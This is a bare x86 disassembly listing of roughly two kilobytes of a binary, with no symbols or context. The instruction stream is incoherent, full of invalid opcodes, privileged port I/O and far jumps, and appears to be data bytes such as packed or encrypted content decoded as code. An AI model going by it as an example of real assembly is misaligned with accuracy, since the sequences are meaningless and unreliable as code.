  411f6f:	(bad)  
  411f70:	push   0xffffffdb
  411f72:	cs nop
  411f74:	rcl    DWORD PTR [edx+0x7b1990d3],0x69
  411f7b:	push   ds
  411f7c:	cmp    DWORD PTR [edi],ecx
  411f7e:	repnz lods eax,DWORD PTR ds:[esi]
  411f80:	stc    
  411f81:	dec    ebx
  411f82:	cmp    dh,bl
  411f84:	fiadd  WORD PTR [ebp+0x52187514]
  411f8a:	adc    BYTE PTR [ebx+ecx*4],al
  411f8d:	sbb    dl,BYTE PTR [edx]
  411f8f:	and    BYTE PTR [esp+eax*2],bl
  411f92:	aaa    
  411f93:	retf   0x6c99
  411f96:	lock sub BYTE PTR fs:[edx-0x5a25efec],dl
  411f9e:	paddd  mm4,mm3
  411fa1:	(bad)  
  411fa2:	icebp  
  411fa3:	dec    ebx
  411fa4:	cli    
  411fa5:	inc    eax
  411fa6:	mov    dl,0x8
  411fa8:	jbe    0x412010
  411faa:	cli    
  411fab:	stos   BYTE PTR es:[edi],al
  411fac:	sub    BYTE PTR [eax],cl
  411fae:	stc    
  411faf:	test   eax,0xf6752659
  411fb4:	popf   
  411fb5:	aam    0xd4
  411fb7:	sub    bl,BYTE PTR [eax+0x48c007f0]
  411fbd:	jl     0x41203b
  411fbf:	and    BYTE PTR [ebp+0x1dd0b7b4],bl
  411fc5:	add    al,0x9f
  411fc7:	ds (bad) 
  411fc9:	push   eax
  411fca:	(bad)  
  411fcb:	jl     0x411fb8
  411fcd:	add    BYTE PTR [edx+eax*8-0x6a],cl
  411fd1:	sbb    eax,0xad5b62ce
  411fd6:	jge    0x412000
  411fd8:	and    al,0x72
  411fda:	cmp    DWORD PTR [ebx-0x455072de],ecx
  411fe0:	lock popa 
  411fe2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411fe3:	xor    edx,edx
  411fe5:	mov    ah,0x56
  411fe7:	jg     0x411fcd
  411fe9:	mov    ecx,0xe0a6a63f
  411fee:	pusha  
  411fef:	addr16 retf 
  411ff1:	clc    
  411ff2:	cmp    esi,DWORD PTR [ecx+0x42]
  411ff5:	push   ecx
  411ff6:	push   edi
  411ff7:	ins    BYTE PTR es:[edi],dx
  411ff8:	mov    dl,0x3a
  411ffa:	add    al,0xc6
  411ffc:	or     eax,DWORD PTR [ebx+0x25]
  411fff:	outs   dx,DWORD PTR ds:[esi]
  412000:	pop    ebx
  412001:	push   eax
  412002:	mov    ds:0x93301e0a,al
  412007:	mov    DWORD PTR [edx+0x77],eax
  41200a:	and    dh,0xb3
  41200d:	lods   eax,DWORD PTR ds:[esi]
  41200e:	jle    0x41201d
  412010:	xchg   ebp,eax
  412011:	pushf  
  412012:	sbb    bl,BYTE PTR [eax]
  412014:	pop    edx
  412015:	call   0x3f65:0xd7f9f5d2
  41201c:	hlt    
  41201d:	cs dec eax
  41201f:	jl     0x412038
  412021:	mov    esp,0x348579e
  412026:	pop    ss
  412027:	and    al,0xa6
  412029:	jno    0x411fc7
  41202b:	lods   eax,DWORD PTR ds:[esi]
  41202c:	adc    eax,0xeae55356
  412031:	cdq    
  412032:	or     eax,0x45f8c3a5
  412037:	or     DWORD PTR [edi],0xeeeb1ad3
  41203d:	inc    ecx
  41203e:	jl     0x41201b
  412040:	rcr    DWORD PTR [edi+0x47],0x11
  412044:	push   esi
  412045:	jecxz  0x41207e
  412047:	pop    es
  412048:	ja     0x41206d
  41204a:	or     eax,0x6022b5a6
  41204f:	jmp    0x3a1:0xc9120c73
  412056:	in     al,dx
  412057:	cld    
  412058:	lds    ebp,FWORD PTR [edi+0x73]
  41205b:	sub    ebx,DWORD PTR [edi]
  41205d:	sbb    DWORD PTR [ebx+0xc7c1707],ebx
  412063:	adc    al,0xa9
  412065:	daa    
  412066:	scas   al,BYTE PTR es:[edi]
  412067:	sar    BYTE PTR [edi],0x5c
  41206a:	mov    ?,ecx
  41206c:	xchg   ebx,edx
  41206e:	outs   dx,DWORD PTR ds:[esi]
  41206f:	loopne 0x4120aa
  412071:	dec    edi
  412072:	in     al,0xf8
  412074:	scas   eax,DWORD PTR es:[edi]
  412075:	push   ebp
  412076:	pop    edi
  412077:	dec    ebp
  412078:	test   BYTE PTR [edi+edx*4+0x3cd12c70],ah
  41207f:	adc    BYTE PTR [edx+0x75],ah
  412082:	shr    bl,0x4d
  412085:	out    0x15,eax
  412087:	mov    edi,fs
  412089:	mov    ebx,0xdbf816e5
  41208e:	shl    ch,0x96
  412091:	pop    edx
  412092:	mov    eax,ds:0x2423b1ad
  412097:	inc    edx
  412098:	add    al,0xef
  41209a:	dec    esp
  41209b:	push   0x834e95b1
  4120a0:	shr    DWORD PTR [ecx-0x2d],cl
  4120a3:	or     al,0xbe
  4120a5:	aad    0x78
  4120a7:	jo     0x412111
  4120a9:	aas    
  4120aa:	popa   
  4120ab:	mov    ebx,0x6e542068
  4120b0:	add    cl,BYTE PTR [ecx]
  4120b2:	loopne 0x412089
  4120b4:	or     DWORD PTR [edx],edi
  4120b6:	cmp    eax,0x4b225b6c
  4120bb:	jne    0x412123
  4120bd:	dec    esp
  4120be:	icebp  
  4120bf:	dec    edx
  4120c0:	hlt    
  4120c1:	out    0x36,al
  4120c3:	sbb    al,0xae
  4120c5:	inc    esp
  4120c6:	cli    
  4120c7:	shl    DWORD PTR [ecx+0x4446aaaf],cl
  4120cd:	sub    BYTE PTR [eax],0xbe
  4120d0:	sub    al,0xd7
  4120d2:	neg    DWORD PTR [esi]
  4120d4:	ret    0xaf05
  4120d7:	xor    DWORD PTR [ecx+eax*2],0xfffffff0
  4120db:	jne    0x412092
  4120dd:	fnstsw WORD PTR [edx]
  4120df:	std    
  4120e0:	mov    esi,0xbba983e9
  4120e5:	jbe    0x41213e
  4120e7:	bound  ebp,QWORD PTR [esp+ebp*8+0x18]
  4120eb:	mov    BYTE PTR [edi+0x51],al
  4120ee:	imul   ecx,edi,0x14e82e5b
  4120f4:	popa   
  4120f5:	push   0x395be9f7
  4120fa:	pop    ecx
  4120fb:	inc    ebx
  4120fc:	outs   dx,BYTE PTR ds:[esi]
  4120fd:	out    0x7b,al
  4120ff:	fld    st(6)
  412101:	xchg   ebp,eax
  412102:	pop    ebp
  412103:	cmp    edx,DWORD PTR [edx+0x4e3f6209]
  412109:	fdiv   DWORD PTR [ebx]
  41210b:	xchg   al,bl
  41210d:	jne    0x412130
  41210f:	test   ecx,ebp
  412111:	std    
  412112:	js     0x412123
  412114:	outs   dx,DWORD PTR ds:[esi]
  412115:	add    BYTE PTR [ecx+eiz*2-0x7d],ah
  412119:	xlat   BYTE PTR ds:[ebx]
  41211a:	sbb    ebx,edi
  41211c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41211d:	imul   edi,eax,0xaa21a499
  412123:	fiadd  DWORD PTR [ebx+edx*8+0x702bf0db]
  41212a:	call   0xd81d65b
  41212f:	pop    esi
  412130:	ret    0x543d
  412133:	or     eax,0xb490f55f
  412138:	aad    0xea
  41213a:	xchg   esi,eax
  41213b:	add    edi,DWORD PTR cs:0xf4a6220b
  412142:	inc    eax
  412143:	or     al,0xda
  412145:	pushf  
  412146:	loope  0x412143
  412148:	ja     0x412144
  41214a:	adc    eax,DWORD PTR [ecx-0x7a2433ef]
  412150:	fsubr  DWORD PTR [edi]
  412152:	push   esi
  412153:	sub    ebp,esi
  412155:	popf   
  412156:	and    ah,ah
  412158:	scas   al,BYTE PTR es:[edi]
  412159:	jge    0x4121c1
  41215b:	or     BYTE PTR [edi],0x4a
  41215e:	rol    BYTE PTR [ebx],1
  412160:	rcl    BYTE PTR [esi-0x40bd652e],0x22
  412167:	call   0x3825:0x158c7a37
  41216e:	xchg   esi,eax
  41216f:	ror    DWORD PTR [ebp+0x363512e1],cl
  412175:	mov    edi,0xe529cd5
  41217a:	sbb    BYTE PTR [eax],0xec
  41217d:	lods   al,BYTE PTR ds:[esi]
  41217e:	jae    0x41214d
  412180:	pop    edx
  412181:	inc    ecx
  412182:	pop    es
  412183:	mov    ebp,0xa7ba65d4
  412188:	shr    BYTE PTR [ebp+esi*8+0x2a],cl
  41218c:	cld    
  41218d:	mov    edi,cs
  41218f:	cmp    eax,0x6c394566
  412194:	mov    eax,ds:0x168346ec
  412199:	mov    eax,ds:0x27deca3e
  41219e:	mov    edi,0x16164f82
  4121a3:	outs   dx,BYTE PTR ds:[esi]
  4121a4:	mov    al,0x21
  4121a6:	push   ds
  4121a7:	out    dx,al
  4121a8:	pushf  
  4121a9:	cmc    
  4121aa:	cwde   
  4121ab:	jno    0x4121d2
  4121ad:	(bad)
  4121b0:	xor    dh,BYTE PTR [esi-0x17]
  4121b3:	adc    al,0x79
  4121b5:	mov    ds:0xfdcbc00b,eax
  4121ba:	bound  eax,QWORD PTR [esi]
  4121bc:	inc    esp
  4121be:	adc    al,0xe4
  4121c0:	mov    ebx,0x49dcb0ae
  4121c5:	out    0xf,eax
  4121c7:	mov    ebp,0x70686c9
  4121cc:	mov    ds:0xcb5c0770,al
  4121d1:	jp     0x412248
  4121d3:	js     0x412174
  4121d5:	mov    ebp,0x4e373c75
  4121da:	pop    edx
  4121db:	mov    DWORD PTR ds:0xf8d290ca,ebp
  4121e1:	pop    edx
  4121e2:	(bad)  
  4121e3:	jmp    0xc30014fd
  4121e8:	xor    al,0x55
  4121ea:	sbb    edx,ecx
  4121ec:	or     ecx,esp
  4121ee:	retf   0x28d5
  4121f1:	cwde   
  4121f2:	pushf  
  4121f3:	jae    0x412179
  4121f5:	iret   
  4121f6:	and    al,0xed
  4121f8:	jmp    0xaef2a33
  4121fd:	imul   esp,DWORD PTR [ebx+0x4a],0xc79197eb
  412204:	or     al,0xf4
  412206:	pop    es
  412207:	test   DWORD PTR [ebp+0x39684b2f],edx
  41220d:	xchg   esi,eax
  41220e:	mov    ebp,0xb8339cbf
  412213:	or     dh,BYTE PTR [edi-0x6a1ed341]
  412219:	(bad)  
  41221a:	mov    esp,0x794f6bac
  41221f:	push   ebp
  412220:	mov    cl,0x7e
  412222:	shr    DWORD PTR [edx+0x51],0x3a
  412226:	outs   dx,BYTE PTR ds:[esi]
  412227:	fs or  al,0x56
  41222a:	arpl   WORD PTR ds:[ecx-0x2],sp
  41222e:	test   BYTE PTR ds:0xa13f46e,bh
  412234:	sub    dl,ch
  412236:	loop   0x4122a4
  412238:	ret    0xdde8
  41223b:	add    al,ch
  41223d:	fld    QWORD PTR [esi-0x18cc485c]
  412243:	dec    ecx
  412244:	test   bh,bl
  412246:	ret    
  412247:	in     eax,dx
  412248:	and    eax,0x924e445c
  41224d:	rcl    BYTE PTR [esi+eax*2],0xff
  412251:	xchg   ecx,eax
  412252:	fstp   QWORD PTR [eax+0x744a9ab0]
  412258:	xchg   edi,eax
  412259:	mov    esi,edi
  41225b:	push   eax
  41225c:	popf   
  41225d:	and    al,0x14
  41225f:	popa   
  412260:	test   ah,bl
  412262:	jno    0x4122de
  412264:	add    ecx,edx
  412266:	imul   edi,DWORD PTR [edx-0x3517f4bf],0xffffff9f
  41226d:	adc    BYTE PTR [edx],dh
  41226f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412270:	sub    BYTE PTR [ebx-0x5c],al
  412273:	sub    edi,ebx
  412275:	inc    ebp
  412276:	xchg   ebx,eax
  412277:	mov    ecx,0x1e5e7931
  41227c:	pop    ss
  41227d:	stos   BYTE PTR es:[edi],al
  41227e:	inc    ebx
  41227f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412280:	imul   edx,DWORD PTR [esi+edx*1-0x4a],0x64130fde
  412288:	retf   
  412289:	cwde   
  41228a:	mov    dh,0x5f
  41228c:	add    eax,0x6dda6f40
  412291:	xchg   edi,eax
  412292:	int3   
  412293:	sub    al,0xc0
  412295:	add    cl,BYTE PTR [edi+0x69]
  412298:	cdq    
  412299:	call   0x4adc39ad
  41229e:	mov    bh,0x6
  4122a0:	dec    esp
  4122a1:	push   ecx
  4122a2:	popf   
  4122a3:	popa   
  4122a4:	out    0x8f,al
  4122a6:	mov    cl,BYTE PTR [eax]
  4122a8:	imul   ebp,DWORD PTR [edx+ebx*4],0xeed97fe6
  4122af:	fimul  DWORD PTR [edx]
  4122b1:	push   esi
  4122b2:	in     al,0x33
  4122b4:	(bad)  
  4122b5:	push   ss
  4122b6:	add    DWORD PTR [edx+0x3158bcde],esp
  4122bc:	sar    al,0xd0
  4122bf:	imul   eax,ecx,0xffffffc0
  4122c2:	jns    0x4122f8
  4122c4:	mov    ds:0x195c7028,al
  4122c9:	in     eax,0x6f
  4122cb:	pop    ds
  4122cc:	shl    DWORD PTR [edi-0x4c34fd30],0xcb
  4122d3:	add    DWORD PTR [esi+ebx*1+0x1a],0xffffff97
  4122d8:	repz iret 
  4122da:	jg     0x412290
  4122dc:	int    0xcb
  4122de:	pop    es
  4122df:	lea    esi,[eax-0x30dc6d18]
  4122e5:	int    0x7a
  4122e7:	popf   
  4122e8:	xchg   ebp,eax
  4122e9:	ins    BYTE PTR es:[edi],dx
  4122ea:	mov    esp,0xa3d07360
  4122ef:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4122f0:	fs addr16 xchg esp,eax
  4122f3:	adc    esi,edi
  4122f5:	clc    
  4122f6:	call   FWORD PTR [esi]
  4122f8:	cmp    edi,DWORD PTR [esi+0x63e2062]
  4122fe:	(bad)  
  4122ff:	in     al,0x3a
  412301:	sbb    eax,0x3c066bdb
  412306:	not    DWORD PTR [ebx]
  412308:	mov    ?,edx
  41230a:	fisttp WORD PTR [edi-0x31dc9a43]
  412310:	jne    0x41231d
  412312:	dec    ebx
  412313:	jb     0x41235a
  412315:	add    DWORD PTR [ecx+0x3ac1432e],esp
  41231b:	repnz repnz ins BYTE PTR es:[edi],dx
  41231e:	push   ebx
  41231f:	daa    
  412320:	pop    ecx
  412321:	call   0x264a:0x2b4f5e69
  412328:	(bad)  
  412329:	(bad)  
  41232a:	mov    ds,WORD PTR [ebx]
  41232c:	(bad)  
  41232d:	pop    edi
  41232e:	mov    ebp,0x2c4c1975
  412333:	xor    ecx,DWORD PTR [esi+0x38399dd]
  412339:	push   esi
  41233a:	dec    eax
  41233b:	pop    ebx
  41233c:	mov    al,0x81
  41233e:	jge    0x412306
  412340:	mov    DWORD PTR ds:0xeee5a85f,0x43feb777
  41234a:	lods   al,BYTE PTR ds:[esi]
  41234b:	or     DWORD PTR [ecx+0x428f3302],eax
  412351:	xor    eax,0x2cb0e57f
  412356:	push   edi
  412357:	dec    esi
  412358:	lods   al,BYTE PTR ds:[esi]
  412359:	data16 fs into 
  41235c:	aam    0xbb
  41235e:	push   ebx
  41235f:	popa   
  412360:	mov    ebp,0xa60a3ebd
  412365:	pushfw 
  412367:	inc    ebx
  412368:	arpl   WORD PTR [edx],ax
  41236a:	xchg   edi,eax
  41236b:	dec    BYTE PTR [edx-0x9f2afd3]
  412371:	int3   
  412372:	mov    ch,BYTE PTR [ebp+0x35]
  412375:	add    eax,0xf14e700d
  41237a:	and    DWORD PTR [edx+ebx*2+0x5ba6a3d],eax
  412381:	jae    0x4123f5
  412383:	or     DWORD PTR [eax-0x270d5f69],0xed718a8c
  41238d:	cmp    al,0x38
  41238f:	popf   
  412390:	jb     0x41238f
  412392:	cmp    cl,BYTE PTR [edi+0x5c5c287a]
  412398:	sbb    BYTE PTR [esp+eiz*8],ch
  41239b:	inc    edx
  41239c:	(bad)  
  41239d:	aaa    
  41239e:	es loop 0x41238a
  4123a1:	cs pop edx
  4123a3:	dec    esi
  4123a4:	out    dx,eax
  4123a5:	scas   al,BYTE PTR es:[edi]
  4123a6:	sub    al,bh
  4123a8:	lods   eax,DWORD PTR ds:[esi]
  4123a9:	pop    esp
  4123aa:	dec    edi
  4123ab:	je     0x4123e5
  4123ad:	inc    ebp
  4123ae:	div    BYTE PTR [eax-0x46]
  4123b1:	sbb    esi,eax
  4123b3:	jno    0x41237a
  4123b5:	xor    ebp,DWORD PTR [edi]
  4123b7:	int3   
  4123b8:	sub    eax,0x232ed879
  4123bd:	dec    edi
  4123be:	push   ebx
  4123bf:	mov    eax,0x4c78289e
  4123c4:	dec    edx
  4123c6:	popf   
  4123c7:	ret    0xf0e6
  4123ca:	sub    eax,0x9a02c693
  4123cf:	mov    DWORD PTR gs:[ecx-0x63345a60],eax
  4123d6:	xchg   esi,eax
  4123d7:	(bad)  
  4123d8:	sti    
  4123d9:	pop    esi
  4123da:	mov    edx,0x7f79a946
  4123df:	sbb    eax,DWORD PTR [edx+0x2b30ca1d]
  4123e5:	xchg   esp,eax
  4123e6:	scas   al,BYTE PTR es:[edi]
  4123e7:	psrld  mm7,QWORD PTR [edi-0x5b]
  4123eb:	inc    ebx
  4123ec:	jb     0x412451
  4123ee:	in     al,dx
  4123ef:	push   esi
  4123f0:	cwde   
  4123f1:	mov    al,ds:0xaf81823d
  4123f6:	fist   WORD PTR [edi-0x76]
  4123f9:	mov    eax,DWORD PTR [ebp+0x3c]
  4123fc:	sahf   
  4123fd:	outs   dx,DWORD PTR ds:[esi]
  4123fe:	adc    esi,DWORD PTR [esi-0x55]
  412401:	hlt    
  412402:	adc    al,0x75
  412404:	aad    0x46
  412406:	ret    0xe8cf
  412409:	sub    al,0x8f
  41240b:	or     al,0xdb
  41240d:	or     cl,0xe5
  412410:	jmp    0xd1cd:0xce004cba
  412417:	(bad)  
  412418:	fistp  DWORD PTR [edi-0x5d0e9cfc]
  41241e:	sahf   
  41241f:	ror    BYTE PTR [esi+ecx*1-0x40e613b4],1
  412426:	jno    0x4124a4
  412428:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412429:	test   eax,0x290e642
  41242e:	clc    
  41242f:	icebp  
  412430:	lods   al,BYTE PTR ds:[esi]
  412431:	fsubp  st(5),st
  412433:	mov    esp,0x9cd2ef50
  412438:	stos   DWORD PTR es:[edi],eax
  412439:	mov    ds:0xe100a381,al
  41243e:	push   ss
  41243f:	sbb    BYTE PTR [ecx+0x191a11bb],al
  412445:	sbb    eax,0xdde74423
  41244a:	add    eax,0x201d51ba
  41244f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412450:	lock pop ds
  412452:	mov    cl,dl
  412454:	mov    eax,ds:0x94b046c2
  412459:	imul   ecx,ebx,0x31a1d33c
  41245f:	xchg   esp,eax
  412460:	js     0x412426
  412462:	sub    DWORD PTR [ebx-0xc92b01],edx
  412468:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412469:	sub    eax,DWORD PTR [edi-0x28]
  41246c:	xchg   ebx,eax
  41246d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41246e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41246f:	push   0xd54957ca
  412474:	jle    0x412443
  412476:	adc    DWORD PTR [esi+0x4d39fd6f],0x6c5f2085
  412480:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412481:	scas   eax,DWORD PTR es:[edi]
  412482:	xor    BYTE PTR [ebp-0x1f92fe2b],bl
  412488:	cmp    edi,DWORD PTR [esi+0x4b]
  41248b:	shl    esi,0x7b
  41248e:	add    bl,bh
  412490:	enter  0x13e9,0x74
  412494:	and    cl,BYTE PTR [ebx+0x5e]
  412497:	out    0x22,eax
  412499:	inc    ecx
  41249a:	outs   dx,BYTE PTR es:[esi]
  41249c:	arpl   cx,bp
  41249e:	ja     0x4124c9
  4124a0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4124a1:	std    
  4124a2:	stos   DWORD PTR es:[edi],eax
  4124a3:	pushf  
  4124a4:	and    BYTE PTR [edx+esi*1+0x503ffeb3],al
  4124ab:	cs mov bh,0x79
  4124ae:	jbe    0x412449
  4124b0:	xchg   BYTE PTR [ebp+0x2e],ah
  4124b3:	inc    esi
  4124b4:	aaa    
  4124b5:	mov    bl,0x80
  4124b7:	ins    DWORD PTR es:[edi],dx
  4124b8:	rcl    DWORD PTR [eax-0x6d9078ee],1
  4124be:	int3   
  4124bf:	push   esi
  4124c0:	xchg   BYTE PTR [ebp-0x5d4a7cb4],cl
  4124c6:	inc    ebp
  4124c7:	dec    esp
  4124c8:	imul   esp,DWORD PTR [edi-0x74037836],0x79
  4124cf:	adc    eax,0xf2e14cb8
  4124d4:	int    0x5
  4124d6:	aad    0x45
  4124d8:	sub    edx,DWORD PTR [edi]
  4124da:	jmp    0xa38ab8e6
  4124df:	push   esp
  4124e0:	dec    eax
  4124e1:	repz sbb ebp,0x32
  4124e5:	sub    esi,DWORD PTR [esi+0x49]
  4124e8:	ret    0x1e3f
  4124eb:	mov    DWORD PTR [edx+0x59],esi
  4124ee:	daa    
  4124ef:	push   0x37
  4124f1:	jecxz  0x4124b9
  4124f3:	pop    edi
  4124f4:	ss push 0xf1ffb265
  4124fa:	jns    0x41250d
  4124fc:	cmp    ebp,DWORD PTR [eax-0x5302c835]
  412502:	jae    0x4124ea
  412504:	push   ebx
  412505:	xlat   BYTE PTR ds:[ebx]
  412506:	ins    DWORD PTR es:[edi],dx
  412507:	dec    ebx
  412508:	jmp    0x5e9ee0df
  41250d:	sub    al,0x48
  41250f:	fist   DWORD PTR [ecx+esi*2-0x1f40ba7c]
  412516:	jno    0x41257f
  412518:	adc    eax,0xbde0b0af
  41251d:	adc    dh,BYTE PTR [ebp-0x24]
  412520:	jb     0x412574
  412522:	lods   al,BYTE PTR ds:[esi]
  412523:	inc    edx
  412524:	das    
  412525:	fcmovu st,st(0)
  412527:	jb     0x4124d9
  412529:	test   BYTE PTR ds:0x4e5c0ea3,ah
  41252f:	cld    
  412530:	test   BYTE PTR [ebx],0x29
  412533:	inc    ecx
  412534:	or     al,0xfc
  412536:	test   al,0x6d
  412538:	pop    ds
  412539:	or     DWORD PTR [edx+0x10],eax
  41253c:	jnp    0x4124d6
  41253e:	mov    ecx,0xabe5b6f8
  412543:	data16 or dl,BYTE PTR [edx+0x340fe477]
  41254a:	pop    es
  41254b:	mov    ecx,0xc3e51171
  412550:	dec    esp
  412551:	dec    edx
  412552:	ret    0x35e2
  412555:	and    DWORD PTR [edx+0x1c],ecx
  412558:	add    BYTE PTR [edi+esi*1],al
  41255b:	mov    ah,0xb7
  41255d:	mov    esi,0x4396b8a6
  412562:	add    bl,BYTE PTR [edx+0x1b]
  412565:	aas    
  412566:	mov    ah,0x4c
  412568:	mov    eax,ds:0x92ce1889
  41256d:	cs inc esp
  41256f:	jb     0x412524
  412571:	mov    ebx,0x7ad81b8
  412576:	in     al,0x22
  412578:	ss test eax,0x332bb676
  41257e:	pop    ebp
  41257f:	and    eax,0x45d4ad0d
  412584:	xchg   edx,eax
  412585:	jae    0x412566
  412587:	mov    al,ds:0x5caef5c6
  41258c:	shl    ah,0xbe
  41258f:	mov    BYTE PTR [edx+ecx*4],al
  412592:	push   cs
  412593:	test   DWORD PTR [edx+0x34b1210d],edx
  412599:	push   0x35174442
  41259e:	stc    
  41259f:	into   
  4125a0:	jg     0x412534
  4125a2:	in     eax,dx
  4125a3:	mov    dl,0x4f
  4125a5:	scas   eax,DWORD PTR es:[edi]
  4125a6:	xor    al,0xfc
  4125a8:	fisttp QWORD PTR [edx+0x3a]
  4125ab:	xchg   esi,eax
  4125ac:	ret    0xb0e9
  4125af:	jl     0x412626
  4125b1:	fsubr  st,st(0)
  4125b3:	std    
  4125b4:	into   
  4125b5:	fdiv   QWORD PTR ds:[edx]
  4125b8:	inc    ecx
  4125b9:	stos   BYTE PTR es:[edi],al
  4125ba:	loopne 0x4125d5
  4125bc:	stos   DWORD PTR es:[edi],eax
  4125bd:	outs   dx,BYTE PTR ds:[esi]
  4125be:	push   es
  4125bf:	fnstenv [ebx+edx*8-0x33acb22a]
  4125c6:	rcr    BYTE PTR [ecx+0x2082d573],1
  4125cc:	cs inc ebx
  4125ce:	lods   eax,DWORD PTR ds:[esi]
  4125cf:	cld    
  4125d0:	repz popa 
  4125d2:	leave  
  4125d3:	cmc    
  4125d4:	jno    0x4125c7
  4125d6:	sub    ebx,DWORD PTR [eax-0x624bb368]
  4125dc:	dec    edi
  4125dd:	pop    eax
  4125de:	mov    ch,0xa2
  4125e0:	loop   0x41261f
  4125e2:	fisttp DWORD PTR [edi]
  4125e4:	mov    DWORD PTR [ecx-0x1e],ecx
  4125e7:	and    eax,0xe1eea209
  4125ec:	ins    DWORD PTR es:[edi],dx
  4125ed:	ror    BYTE PTR [ebp+0x54],cl
  4125f0:	mov    WORD PTR [edi+eiz*8],?
  4125f3:	mov    al,0x7e
  4125f5:	push   esi
  4125f6:	mov    bh,0xd0
  4125f8:	dec    ecx
  4125f9:	sbb    eax,0x1891aea6
  4125fe:	(bad)  
  4125ff:	adc    eax,0xd54c70d8
  412604:	xchg   esi,eax
  412605:	ja     0x4125b3
  412607:	cli    
  412608:	outs   dx,BYTE PTR ds:[esi]
  412609:	not    DWORD PTR [ebp+0x49]
  41260c:	lea    ebp,[edi+0x66]
  41260f:	mov    dl,0x81
  412611:	pop    eax
  412612:	adc    bh,BYTE PTR [edi]
  412614:	jl     0x412622
  412616:	bt     DWORD PTR [esp+ecx*8-0x3d],edx
  41261b:	xchg   ebp,eax
  41261c:	xchg   ecx,eax
  41261d:	inc    eax
  41261e:	or     BYTE PTR [ebx+0x17],cl
  412621:	mov    edi,0x961e8d9a
  412626:	dec    ebp
  412627:	push   ds
  412628:	stc    
  412629:	clc    
  41262a:	ror    BYTE PTR [ebx-0x23],cl
  41262d:	xor    eax,0x5cf67a4
  412632:	inc    ecx
  412633:	xchg   BYTE PTR [edx+0x36fd459e],bh
  412639:	out    0xdb,al
  41263b:	jg     0x412646
  41263d:	push   edi
  41263e:	xor    DWORD PTR [eax-0x66b91f45],0xe957899e
  412648:	jge    0x412683
  41264a:	adc    dl,al
  41264c:	fdivr  st(2),st
  41264e:	addr16 std 
  412650:	test   al,0x79
  412652:	lock xor al,0x2c
  412655:	mov    ds,WORD PTR [edi+0x4ab5c751]
  41265b:	jae    0x412659
  41265d:	out    0xf2,eax
  41265f:	mov    bl,0x4c
  412661:	inc    edi
  412662:	stos   DWORD PTR es:[edi],eax
  412663:	out    0x51,al
  412665:	sti    
  412666:	mov    bl,0x10
  412668:	cdq    
  412669:	mov    edi,0x5cfee9ee
  41266e:	xlat   BYTE PTR ss:[ebx]
  412670:	out    0x2d,eax
  412672:	xchg   ebx,eax
  412673:	dec    ebx
  412674:	mov    edi,0x5b22145b
  412679:	and    eax,0x6c609ddc
  41267e:	jl     0x41267e
  412680:	adc    cl,BYTE PTR [edi]
  412682:	ja     0x412655
  412684:	xlat   BYTE PTR ds:[ebx]
  412685:	rol    DWORD PTR ds:0x8aa9459,0xdf
  41268c:	lods   al,BYTE PTR ds:[esi]
  41268d:	pop    esi
  41268e:	inc    esi
  41268f:	or     BYTE PTR [edi+ebp*2+0x25],ch
  412693:	jns    0x412627
  412695:	cwde   
  412696:	xor    BYTE PTR [edi+0x76],dh
  412699:	(bad)  
  41269a:	adc    ah,ah
  41269c:	add    DWORD PTR [eax-0xd],ecx
  41269f:	sub    cl,BYTE PTR [edi-0x3bcda300]
  4126a5:	std    
  4126a6:	std    
  4126a7:	or     al,0xed
  4126a9:	sbb    edx,DWORD PTR [esi+0x71df8d3f]
  4126af:	lock cmp ecx,eax
  4126b2:	jmp    0x39b:0x2b5c2979
  4126b9:	mov    ah,0xf0
  4126bb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4126bc:	push   ss
  4126bd:	mov    edi,0x357d8eb7
  4126c2:	pop    edx
  4126c3:	je     0x412659
  4126c5:	xchg   esp,eax
  4126c6:	in     al,0x2
  4126c8:	rol    BYTE PTR [ebp-0x608cb12a],1
  4126ce:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4126cf:	mov    ebx,0x4a1c1445
  4126d4:	mov    cl,0x98
  4126d6:	lods   eax,DWORD PTR ds:[esi]
  4126d7:	pop    ss
  4126d8:	mov    cs,WORD PTR [ecx+0x14]
  4126db:	ror    bh,cl
  4126dd:	ss push ebx
  4126df:	arpl   di,dx
  4126e1:	popf   
  4126e2:	inc    eax
  4126e3:	add    al,0xad
  4126e5:	mov    ebx,0x68e8ae62
  4126ea:	cmc    
  4126eb:	in     eax,0xc2
  4126ed:	hlt    
  4126ee:	jge    0x4126e5
  4126f0:	(bad)  
  4126f1:	and    ch,BYTE PTR ds:[esi]
  4126f4:	outs   dx,DWORD PTR ds:[esi]
  4126f5:	and    edi,edi
  4126f7:	out    dx,eax
  4126f8:	add    al,BYTE PTR [edx+0xb]
  4126fb:	sbb    BYTE PTR [ebp+0xb],ch
  4126fe:	and    al,0x7d
  412700:	mov    edi,0x934a9370
  412705:	imul   edx,DWORD PTR [ebx+0x65a32d79],0xffffffe1
  41270c:	retf   0x6e12
  41270f:	adc    dl,bl
  412711:	or     ebp,ebp
  412713:	out    dx,eax
  412714:	dec    ecx
  412715:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412716:	adc    eax,0x79fe4600
  41271b:	push   ss
  41271c:	xor    al,0x44
  41271e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41271f:	add    al,0x7d
  412721:	and    ebp,DWORD PTR [edx+0x23]
  412724:	pop    eax
  412725:	jnp    0x4127a4
  412727:	mov    bl,dh
  412729:	push   DWORD PTR [ebx]
  41272b:	push   0x55c20ec3
  412730:	ins    DWORD PTR es:[edi],dx
  412731:	or     eax,0xe52944cb
  412736:	add    ch,BYTE PTR [eax-0x2b1afb70]
  41273c:	inc    ecx
  41273d:	out    dx,eax
  41273e:	mov    eax,ds:0xd52c66d0
  412743:	jae    0x4126ed
  412745:	push   ebp
  412746:	popf   
  412747:	jbe    0x41276d
  412749:	sbb    edx,DWORD PTR [eax+0xf]
  41274c:	push   eax
